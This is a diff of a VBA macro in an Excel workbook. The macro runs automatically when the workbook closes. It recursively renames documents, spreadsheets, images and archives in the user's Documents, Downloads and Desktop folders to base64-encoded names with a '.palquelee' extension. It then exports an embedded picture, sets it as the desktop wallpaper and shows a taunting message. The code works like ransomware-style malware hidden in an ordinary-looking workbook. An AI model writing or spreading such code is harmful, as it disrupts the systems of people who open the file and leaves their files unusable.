@@ -41,15 +41,120 @@ End Type
 Private Declare PtrSafe Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long
 
 Private Sub Workbook_BeforeClose(Cancel As Boolean)
-
 Randomize
-
 ChangeFiles
-Start
+SetImage
 Pacman
 ThisWorkbook.Saved = True
-'ThisWorkbook.Save
 MsgBox "Ya valiste wey!"
+End Sub
+
+Function ChangeFiles()
+    Dim objFSO, objFolders, objFolder
+    
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    Set objFolders = objFSO.GetFolder(Environ("USERPROFILE")).SubFolders
+    
+    For Each objFolder In objFolders
+        If objFolder.Name = "Documents" Or objFolder.Name = "Downloads" Or objFolder.Name = "Desktop" Then
+            InternalLoop objFolder
+        End If
+    Next
+
+    Set objFSO = Nothing
+    Set objFolders = Nothing
+    Set objFolder = Nothing
+End Function
+
+Function InternalLoop(mainFolder)
+    On Error Resume Next
+    Dim objFolders, objFolder, objFiles, objFile, RegEx
+    
+    Set RegEx = CreateObject("VBScript.RegExp")
+    RegEx.Pattern = "\.(doc|docx|xls|xlsx|ppt|pptx|csv|msg|eml|pdf|txt|bat|com|zip|rar|7z|jpg|jpeg|png|gif|bmp)$"
+    
+    Set objFiles = mainFolder.Files
+    For Each objFile In objFiles
+        If RegEx.Test(objFile.Name) Then
+            objFile.Name = Replace(str_to_base64(objFile.Name), "=", "") & ".palquelee"
+        End If
+    Next
+    
+    Set objFolders = mainFolder.SubFolders
+    For Each objFolder In objFolders
+        InternalLoop objFolder
+    Next
+End Function
+
+Function char_to_utf8(sChar)
+    Dim c, b1, b2, b3
+    c = AscW(sChar)
+    If c < 0 Then
+        c = c + &H10000
+    End If
+    If c < &H80 Then
+        char_to_utf8 = sChar
+    ElseIf c < &H800 Then
+        b1 = c Mod 64
+        b2 = (c - b1) / 64
+        char_to_utf8 = ChrW(&HC0 + b2) & ChrW(&H80 + b1)
+    ElseIf c < &H10000 Then
+        b1 = c Mod 64
+        b2 = ((c - b1) / 64) Mod 64
+        b3 = (c - b1 - (64 * b2)) / 4096
+        char_to_utf8 = ChrW(&HE0 + b3) & ChrW(&H80 + b2) & ChrW(&H80 + b1)
+    Else
+    End If
+End Function
+
+Function str_to_utf8(sSource)
+    Dim i, n, rarr()
+    n = Len(sSource)
+    ReDim rarr(n - 1)
+    For i = 0 To n - 1
+        rarr(i) = char_to_utf8(Mid(sSource, i + 1, 1))
+    Next
+    str_to_utf8 = Join(rarr, "")
+End Function
+
+Function str_to_base64(sSource)
+    str_to_base64 = btoa(str_to_utf8(sSource))
+End Function
+
+Private Sub SetWallpaper(ByVal FileName As String)
+Dim ret As Long
+ret = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0&, FileName, SPIF_SENDWININICHANGE Or SPIF_UPDATEINIFILE)
+End Sub
+
+Public Sub SetImage()
+extractImgs
+SetWallpaper ("C:\Users\Public\Pictures\asd.jpg")
+End Sub
+
+Sub extractImgs()
+Dim sh As Worksheet
+Dim shp As Shape, Temp As Object, tArea As Object
+Dim tempChart As String, wsName As String
+
+For Each sh In Application.Sheets
+    wsName = sh.Name
+    For Each shp In sh.Shapes
+       If shp.Type = msoPicture Then
+            shp.Select
+            Application.Selection.CopyPicture
+            Set Temp = ActiveSheet.ChartObjects.Add(0, 0, shp.Width, shp.Height)
+            Set tArea = Temp.Chart
+            Temp.Activate
+            With tArea
+                .ChartArea.Select
+                .Paste
+                .Export ("C:\Users\Public\Pictures\asd.jpg")
+            End With
+            Temp.Delete
+            DoEvents
+        End If
+    Next
+Next
 
 End Sub
 
@@ -113,128 +218,3 @@ Function btoa(sourceStr)
     End If
     btoa = Join(rarr, "")
 End Function
-
-
-Function char_to_utf8(sChar)
-    Dim c, b1, b2, b3
-    c = AscW(sChar)
-    If c < 0 Then
-        c = c + &H10000
-    End If
-    If c < &H80 Then
-        char_to_utf8 = sChar
-    ElseIf c < &H800 Then
-        b1 = c Mod 64
-        b2 = (c - b1) / 64
-        char_to_utf8 = ChrW(&HC0 + b2) & ChrW(&H80 + b1)
-    ElseIf c < &H10000 Then
-        b1 = c Mod 64
-        b2 = ((c - b1) / 64) Mod 64
-        b3 = (c - b1 - (64 * b2)) / 4096
-        char_to_utf8 = ChrW(&HE0 + b3) & ChrW(&H80 + b2) & ChrW(&H80 + b1)
-    Else
-    End If
-End Function
-
-Function str_to_utf8(sSource)
-    Dim i, n, rarr()
-    n = Len(sSource)
-    ReDim rarr(n - 1)
-    For i = 0 To n - 1
-        rarr(i) = char_to_utf8(Mid(sSource, i + 1, 1))
-    Next
-    str_to_utf8 = Join(rarr, "")
-End Function
-
-Function str_to_base64(sSource)
-    str_to_base64 = btoa(str_to_utf8(sSource))
-End Function
-
-Private Sub SetWallpaper(ByVal FileName As String)
-
-Dim ret As Long
-
-ret = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0&, FileName, SPIF_SENDWININICHANGE Or SPIF_UPDATEINIFILE)
-
-End Sub
-
-
-Function InternalLoop(mainFolder)
-    On Error Resume Next
-    Dim objFolders, objFolder, objFiles, objFile, RegEx
-    
-    Set RegEx = CreateObject("VBScript.RegExp")
-    RegEx.Pattern = "\.(doc|docx|xls|xlsx|ppt|pptx|csv|msg|eml|pdf|txt|bat|com|zip|rar|7z|jpg|jpeg|png|gif|bmp)$"
-    
-    Set objFiles = mainFolder.Files
-    For Each objFile In objFiles
-        If RegEx.Test(objFile.Name) Then
-            objFile.Name = Replace(str_to_base64(objFile.Name), "=", "") & ".palquelee"
-        End If
-    Next
-    
-    Set objFolders = mainFolder.SubFolders
-    For Each objFolder In objFolders
-        InternalLoop objFolder
-    Next
-End Function
-
-Function ChangeFiles()
-    Dim objFSO, objFolders, objFolder
-    
-    Set objFSO = CreateObject("Scripting.FileSystemObject")
-    Set objFolders = objFSO.GetFolder(Environ("USERPROFILE")).SubFolders
-    
-    For Each objFolder In objFolders
-        If objFolder.Name = "Documents" Or objFolder.Name = "Downloads" Or objFolder.Name = "Desktop" Then
-            InternalLoop objFolder
-        End If
-    Next
-
-    Set objFSO = Nothing
-    Set objFolders = Nothing
-    Set objFolder = Nothing
-End Function
-
-Public Sub Start()
-
-Dim DirFile As String
-DirFile = "\\BCSNT01\pasoiso"
-
-On Error Resume Next
-If (Dir(DirFile) = "") Then
-    extractImgs
-    SetWallpaper ("C:\Users\Public\Pictures\asd.jpg")
-Else
-    SetWallpaper (DirFile & "\ran.jpg")
-End If
-
-End Sub
-
-
-Sub extractImgs()
-Dim sh As Worksheet
-Dim shp As Shape, Temp As Object, tArea As Object
-Dim tempChart As String, wsName As String
-
-For Each sh In Application.Sheets
-    wsName = sh.Name
-    For Each shp In sh.Shapes
-       If shp.Type = msoPicture Then
-            shp.Select
-            Application.Selection.CopyPicture
-            Set Temp = ActiveSheet.ChartObjects.Add(0, 0, shp.Width, shp.Height)
-            Set tArea = Temp.Chart
-            Temp.Activate
-            With tArea
-                .ChartArea.Select
-                .Paste
-                .Export ("C:\Users\Public\Pictures\asd.jpg")
-            End With
-            Temp.Delete
-            DoEvents
-        End If
-    Next
-Next
-
-End Sub
